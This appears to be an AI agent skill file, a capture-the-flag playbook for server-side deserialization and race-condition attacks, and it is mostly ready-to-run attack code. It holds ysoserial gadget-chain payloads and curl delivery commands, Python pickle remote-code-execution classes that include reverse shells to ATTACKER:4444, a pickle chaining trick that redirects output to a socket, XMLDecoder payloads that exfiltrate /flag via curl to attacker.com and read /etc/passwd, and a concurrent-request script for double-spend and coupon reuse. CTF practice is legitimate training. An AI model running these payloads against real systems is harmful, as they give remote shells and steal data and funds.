---
name: web-server-deser
description: "CTF web server-side deserialization and execution attacks. Java deserialization with ysoserial gadget chains (CommonsCollections, Spring, URLDNS), Python pickle deserialization RCE via __reduce__, race condition TOCTOU balance bypass, VolgaCTF pickle chaining via STOP opcode stripping with os.dup2 stdout redirect, Java XMLDecoder RCE without gadget chains. Triggers: 'java deserialization', 'ysoserial', 'pickle deserialization', 'race condition ctf', 'toctou exploit', 'xmldecoder rce', 'python pickle rce', 'pickle gadget', 'deserialization ctf', 'gadget chain', 'rO0AB exploit', 'aced0005'."
---

# CTF Web: Deserialization & Execution Attacks

Java ysoserial, Python pickle, race conditions, XMLDecoder.

---

## Phase 1: Java Deserialization

**Detection:**
```bash
# Base64 blob starting with rO0AB = Java serialized object
echo "rO0AB..." | base64 -d | xxd | head -1
# Magic bytes: AC ED 00 05

# Search source for dangerous patterns:
grep -r "ObjectInputStream\|readObject\|readUnshared" src/
# Content-Type: application/x-java-serialized-object
```

```bash
# Generate payloads with ysoserial:
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser

# Try chains in order:
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsBeanutils1 (Apache Commons BeanUtils)
# Spring1/Spring2 (Spring Framework)
# URLDNS (blind DNS callback: no RCE needed for detection)

# Blind detection via DNS callback:
java -jar ysoserial.jar URLDNS 'http://YOURHOST.burpcollaborator.net' | base64

# Send payload:
curl -X POST http://target/api \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.ser
```

**Filter bypass:**
```bash
# Blocklisted classes → try alternative chains
# Java 17+ module restrictions → look for app-specific gadgets
# Jackson/Fastjson deserialization as alternative
# marshalsec for JNDI server:
java -jar marshalsec.jar RMIRefServer "http://attacker/#Exploit"
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64
```

---

## Phase 2: Python Pickle Deserialization RCE

**Detection:**
```python
# Base64 blobs: \x80\x04\x95 (protocol 4) or \x80\x05\x95 (protocol 5)
# Search source: pickle.loads(), shelve, joblib.load(), torch.load()
# Flask sessions with pickle serializer
```

```python
import pickle, base64, os

# Basic RCE via __reduce__:
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)  # send as cookie/POST body

# Reverse shell:
class RevShell:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'
        return (os.system, (cmd,))

# Multi-line via exec:
class ExecRCE:
    def __reduce__(self):
        code = 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
        return (exec, (code,))
```

**Restricted unpickler bypass:**
```python
# If RestrictedUnpickler blocks specific modules:
# Chain through allowed classes only
# YAML with yaml.load() (no SafeLoader): !!python/object/apply:os.system [id]
# NumPy: numpy.load(allow_pickle=True) triggers pickle
```

---

## Phase 3: Race Conditions (TOCTOU)

```python
import asyncio, aiohttp

async def race(url, data, headers, n=20):
    """Send n identical requests simultaneously."""
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(race(
    'http://target/api/transfer',
    {'to': 'attacker', 'amount': 1000},
    {'Cookie': 'session=...'},
    n=50
))
```

```bash
# Turbo Intruder (Burp) for precise timing: preferred

# GNU parallel for rapid parallel requests:
seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
```

**Common CTF race targets:**
- Double-spend: `if balance >= amount` → 50 simultaneous transfers
- Coupon reuse: single-use code → redeem simultaneously
- Registration uniqueness: same username → admin account takeover
- File upload + use: access between upload and validation

---

## Phase 4: Pickle Chaining via STOP Opcode Stripping

```python
import pickle, os

# Pattern: chain multiple pickle operations in single loads() call
# Remove STOP opcode (\x2e) from first payload → VM continues to second

class Redirect:
    def __reduce__(self):
        return (os.dup2, (5, 1))  # Redirect stdout to socket fd 5

class Execute:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

# Strip STOP from first payload, concatenate second:
payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())

# When to use: remote pickle deserialization where output not returned
# dup2 redirects stdout to socket → command output flows back to attacker
```

---

## Phase 5: Java XMLDecoder RCE (No Gadget Chain)

```xml
<!-- Send as XML input to endpoint using XMLDecoder -->
<object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
    </array>
  </void>
</object>

<!-- Alternative: direct command with output -->
<object class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="2">
    <void index="0"><string>cat</string></void>
    <void index="1"><string>/etc/passwd</string></void>
  </array>
  <void method="start"/>
</object>
```

---

## Phase 6: Detection Checklist

```bash
# Java: look for these endpoints / content types
curl -s http://target/ | grep -i "java\|spring\|jboss\|weblogic\|jenkins"
# Test with URLDNS gadget first (blind detection, no RCE)

# Python: look for these patterns
curl http://target/login -c cookies.txt
cat cookies.txt | grep -E '^[A-Za-z0-9+/=]{20,}'  # base64 blob = possible pickle
python3 -c "import base64; d=base64.b64decode('COOKIE'); print(d[:5])"

# Race conditions: look for non-atomic multi-step operations
# - balance check + deduct
# - unique check + insert
# - file upload + process
```

---

## Output

Save to `.omop/engagement/ctf/web/`:
- `payload.ser`: Java deserialization payload
- `pickle_payload.py`: Python pickle exploit
- `flag.txt`: found flag

## Next Phase

→ `ctf-web-server-side` for SQLi, SSTI, SSRF, XXE
→ `ctf-web-server-exec` for command injection and execution
→ `ctf-web-node-prototype` for prototype pollution
